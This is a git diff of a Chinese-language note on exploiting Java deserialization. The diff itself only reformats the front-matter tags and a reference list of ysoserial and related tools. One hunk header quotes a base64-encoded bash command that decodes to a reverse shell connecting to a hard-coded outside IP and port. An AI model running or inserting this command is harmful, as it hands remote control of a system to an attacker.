@@ -1,7 +1,7 @@
 ---
 author: XhstormR
 tags:
-- Notes
+  - Notes
 date: 2021-01-27T16:40:13+08:00
 title: Java 反序列化漏洞利用
 ---
@@ -46,7 +46,8 @@ bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45OC4xMzUuNjUvNDM5OSAwPiYx}|{base64,
 ```
 
 ## Reference
-* https://github.com/frohoff/ysoserial
-* https://github.com/zema1/ysoserial
-* https://github.com/NickstaDB/SerializationDumper
-* http://jackson-t.ca/runtime-exec-payloads.html
+
+- https://github.com/frohoff/ysoserial
+- https://github.com/zema1/ysoserial
+- https://github.com/NickstaDB/SerializationDumper
+- http://jackson-t.ca/runtime-exec-payloads.html
